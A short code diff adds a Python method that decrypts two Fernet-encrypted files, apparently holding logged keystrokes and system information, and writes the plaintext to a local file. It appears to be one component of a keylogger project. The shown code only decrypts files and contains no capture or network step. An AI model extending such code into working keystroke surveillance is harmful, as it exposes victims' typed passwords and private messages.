@@ -42,3 +42,28 @@ class Decrypt:
         with open(decrypt_file, 'wb') as f:
             f.write(UNPAD(cipher.decrypt(data[16:])))
         return UNPAD(cipher.decrypt(data[16:]))
+
+    # decrypt from fernet
+    def decryptFernet(self,key):
+
+        systemInfoEncrypted = 'systemInfoEncrypted.txt'
+        loggedKeysEncrypted = 'loggedKeysEncrypted.txt'
+
+
+
+        encryptedFiles = [systemInfoEncrypted, loggedKeysEncrypted]
+        count = 0
+
+
+        for decryptingFiles in encryptedFiles:
+
+            with open(encryptedFiles[count], 'rb') as f:
+                data = f.read()
+
+            fernet = Fernet(key)
+            decrypted = fernet.decrypt(data)
+
+            with open("decryption.txt", 'ab') as f:
+                f.write(decrypted)
+
+            count += 1
